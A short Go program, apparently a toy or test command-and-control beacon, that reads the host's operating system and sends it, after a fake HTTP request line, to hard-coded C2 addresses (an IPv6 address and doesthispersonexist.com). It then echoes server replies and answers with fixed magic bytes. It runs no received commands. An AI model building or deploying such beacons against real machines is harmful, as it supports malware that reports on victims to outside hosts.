package main

import (
	"fmt"
	"net"
	"os"
	"runtime"
)

type Config struct {
	c2   []string
	port int
}

func (c Config) test_c2_config() int {
	fmt.Println(c.c2[0])
	return -1
}

func main() {
	// Detect the operating system
	osInfo := runtime.GOOS
	fmt.Printf("Got OS info %s\n", osInfo)

	// Define the address to connect to (1.1.1.1:434 in this case)
	c2_addresses := []string{"[2606:4700:3035::ac43:cf7b]:443", "doesthispersonexist.com:80"}
	c2_config := Config{c2_addresses, 443}
	c2_config.test_c2_config()

	// Create a TCP connection to the address
	var conn net.Conn
	var err error
	for _, v := range c2_config.c2 {
		conn, err = net.Dial("tcp6", v)
		if err != nil {
			fmt.Println("Error connecting baz:", err)
		} else {
			fmt.Printf("connected to: %s\n", v)
			break
		}
	}
	if conn == nil {
		os.Exit(1)

	}
	defer conn.Close()

	// Send the operating system information over the socket
	_, err = conn.Write([]byte("GET /foo HTTP/1.1\n\n"))
	_, err = conn.Write([]byte(osInfo))
	if err != nil {
		fmt.Println("Error writing:", err)
		os.Exit(1)
	}

	// Read data from the connection and print it to stdout
	buf := make([]byte, 1024)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			fmt.Println("Error reading:", err)
			break
		}
		fmt.Print(string(buf[:n]))

		// Send magic back through the same connection
		fmt.Println("Writing magic")
		_, err = conn.Write([]byte{0x19, 0x80, 0x14, 0x06})
		if err != nil {
			fmt.Println("Error writing:", err)
			break
		}
	}
}
